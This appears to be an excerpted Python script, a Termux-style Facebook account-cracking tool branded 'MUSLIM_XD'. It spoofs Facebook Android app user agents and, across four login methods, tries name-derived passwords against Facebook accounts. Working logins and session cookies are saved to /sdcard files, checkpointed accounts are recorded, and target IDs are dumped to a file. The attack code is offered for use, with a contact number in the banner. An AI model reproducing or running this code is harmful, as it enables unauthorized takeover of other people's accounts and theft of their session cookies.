...
def randBuildvsskj():
    END = '[FBAN/FB4A;FBAV/125.0.0.23.80;FBBV/125;FBDM/{density=3.0,width=1242,height=2208};FBLC/fr_MA;FBRV/125.0.0.23.80;FBCR/Salaam Telecom;FBMF/Huawei_P40_Pro;FBBD/Huawei_P40_Pro;FBPN/com.facebook.katana;FBDV/Huawei_P40_Pro_9_0;FBSV/9.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
...
logo =                                          """%s
╔═╗╔═╗╔═╗╔═╗╔╗ ╔═╗╔═╗╦╔═  ╦╔╦╗ MUSLIM_XD
╠╣ ╠═╣║  ║╣ ╠╩╗║ ║║ ║╠╩╗  ║ ║║ \x1b[1;97mVersion 5.0
╚  ╩ ╩╚═╝╚═╝╚═╝╚═╝╚═╝╩ ╩  ╩═╩╝ \x1b[1;92MUSLIM_XD \x1b[1;97LAIRRI \x1b[0;34mV.0.1
\x1b[1;97m─────────────────────────
\x1b[1;97mHemkerTermos :\x1b[1;92MUSLIM XD 
\x1b[1;92mNo Whatsap :\x1b[1;97m213556477655
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back MUSLIM Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {R}[MUSLIM] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [MUSLIM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/MUSLIM_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MUSLIM_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    session = q['session_cookies']
                    cookie = ''
                    cuser = session[0]
                    ...
                    break
                     ...
                     cps.append(sid)
                     open('/sdcard/MUSLIM_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[MUSLIM] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [MUSLIM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/MUSLIM_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MUSLIM_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[MUSLIM] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[MUSLIM] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [MUSLIM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/MUSLIM_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{R}File Name To Dump Ids. Example /sdcard/MUSLIM.txt\n') 
        filepath = input("Put File Name: ")
